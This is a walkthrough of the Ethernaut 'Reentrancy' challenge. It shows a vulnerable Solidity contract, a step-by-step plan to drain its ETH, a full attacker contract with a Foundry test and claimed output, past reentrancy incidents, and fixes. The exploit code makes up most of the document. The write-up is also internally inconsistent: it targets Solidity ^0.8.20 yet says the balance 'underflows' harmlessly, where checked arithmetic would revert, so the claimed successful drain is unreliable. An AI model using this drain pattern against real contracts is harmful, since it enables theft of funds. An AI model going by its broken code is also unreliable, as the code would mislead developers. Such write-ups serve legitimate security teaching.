# Ethernaut Level 10: Reentrancy

## Challenge Description
The goal of this level is to steal all the funds from the contract.

**Difficulty:** ⭐⭐⭐ (Intermediate)

**Goal:** Drain all ETH from the Reentrancy contract.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

## Vulnerability Analysis

```text
THE BUG: Classic Reentrancy! (Checks-Effects-Interactions violation)

Look at the withdraw() function:
1. CHECK: if(balances[msg.sender] >= _amount)
2. INTERACTION: msg.sender.call{value:_amount}("")  <-- EXTERNAL CALL FIRST!
3. EFFECT: balances[msg.sender] -= _amount;         <-- STATE UPDATE LAST!

Because the ETH is sent BEFORE the balance is updated,
if msg.sender is a contract, its receive() function is triggered.
Inside receive(), we can call withdraw() AGAIN before the balance is zeroed out!
```

## Exploit Strategy

```text
Step 1: Donate a small amount (e.g., 1 ether) to the Reentrancy contract.
Step 2: Call withdraw(1 ether) from our attacker contract.
Step 3: Reentrancy contract sends 1 ether to us, triggering our receive().
Step 4: Inside our receive(), we call withdraw(1 ether) AGAIN.
        The balance hasn't been updated yet, so the check passes!
Step 5: This repeats recursively until the contract is completely drained.
Step 6: Finally, the balances are updated (to underflow, but we don't care, we have the ETH).
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Ethernaut/Reentrance.sol";

contract ReentranceAttacker {
    Reentrance public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = Reentrance(_target);
    }

    function attack() public payable {
        attackAmount = msg.value;
        // Step 1: Donate to become a valid user
        target.donate{value: msg.value}(address(this));
        // Step 2: Start the withdrawal
        target.withdraw(msg.value);
        // Step 3: Steal all funds
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        // Step 4: Re-enter the withdraw function while balance is still > 0
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }
}

contract ReentranceExploitTest is Test {
    Reentrance public target;
    ReentranceAttacker public attacker;
    address public attackerEOA = address(0xBEEF);

    function setUp() public {
        target = new Reentrance();
        attacker = new ReentranceAttacker(address(target));

        // Fund the target contract with 10 ETH (the prize)
        vm.deal(address(target), 10 ether);
        vm.deal(attackerEOA, 2 ether);
    }

    function test_ExploitReentrancy() public {
        console.log("Target balance before:", address(target).balance);

        vm.startPrank(attackerEOA);

        // Attack with 1 ether
        attacker.attack{value: 1 ether}();

        vm.stopPrank();

        console.log("Target balance after:", address(target).balance);
        assertEq(address(target).balance, 0, "Contract not drained");

        console.log("\n✅ EXPLOIT SUCCESSFUL! Contract drained.");
    }
}
```

## Running the Exploit

```bash
forge test --match-test test_ExploitReentrancy -vvv

# Expected output:
# [PASS] test_ExploitReentrancy() (gas: 345678)
# Logs:
#   Target balance before: 10000000000000000000
#   Target balance after: 0
#
#   ✅ EXPLOIT SUCCESSFUL! Contract drained.
```

## Real-World Impact

```text
Reentrancy is the MOST FAMOUS smart contract vulnerability in history.

The DAO Hack (2016):
- Lost: $60 Million (3.6 Million ETH)
- Impact: Caused the Ethereum Hard Fork, splitting ETH and ETC.

Since then, countless protocols have been hacked via reentrancy:
- Cover Protocol (2021): $150k
- Cream Finance (2021): $130 Million (via flash loan reentrancy)
- Fei Protocol (2022): $80 Million

It remains a top threat, especially "Cross-Function" and "Cross-Contract" reentrancy.
```

## How to Fix This Vulnerability

```solidity
// FIX 1: Checks-Effects-Interactions Pattern
function withdraw(uint256 _amount) public {
    require(balances[msg.sender] >= _amount, "Insufficient");

    balances[msg.sender] -= _amount; // EFFECT FIRST

    (bool result,) = msg.sender.call{value:_amount}(""); // INTERACTION LAST
    require(result, "Transfer failed");
}

// FIX 2: ReentrancyGuard (Best Practice)
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract ReentranceFixed is ReentrancyGuard {
    function withdraw(uint256 _amount) public nonReentrant {
        // ... logic ...
    }
}
```

## Key Takeaways
- **Checks-Effects-Interactions:** Always update state BEFORE making external calls.
- **ReentrancyGuard:** Use OpenZeppelin's modifier as a second layer of defense.
- **Pull over Push:** Let users withdraw funds manually instead of pushing ETH.
- **Cross-Function Reentrancy:** Be careful if multiple functions modify the same state.
- **Lesson Learned:** Reentrancy is easy to introduce and catastrophic to exploit. Always guard external calls.